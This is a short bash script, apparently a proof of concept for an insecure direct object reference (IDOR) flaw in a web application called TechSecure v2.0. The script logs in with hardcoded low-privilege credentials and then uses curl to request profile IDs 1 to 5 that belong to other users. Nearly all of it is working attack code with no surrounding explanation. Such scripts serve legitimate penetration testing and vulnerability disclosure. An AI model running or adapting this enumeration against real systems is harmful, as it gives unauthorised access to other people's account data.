#!/usr/bin/env bash
# IDOR enumeration against TechSecure v2.0 user profile API.
# Logs in as a low-privilege user, then requests a range of profile IDs
# that do not belong to that user, demonstrating unauthorized access
# to other accounts' data.
#
# Usage: ./idor_enumeration.sh

set -euo pipefail

TARGET_HOST="10.216.27.100:8080"
USERNAME="budi.santoso"
PASSWORD="Budi12345"
ID_RANGE="1 2 3 4 5"
COOKIE_JAR="/tmp/techsecure_cookies.txt"

echo "[*] Authenticating as ${USERNAME}..."
curl -s -c "${COOKIE_JAR}" -X POST "http://${TARGET_HOST}/index.php" \
  -d "user=${USERNAME}&pass=${PASSWORD}" -o /dev/null

echo "[*] Enumerating user profile IDs..."
for id in ${ID_RANGE}; do
  echo "--- id=${id} ---"
  curl -s -b "${COOKIE_JAR}" "http://${TARGET_HOST}/api/v1/users/profile.php?id=${id}"
  echo
  sleep 1
done
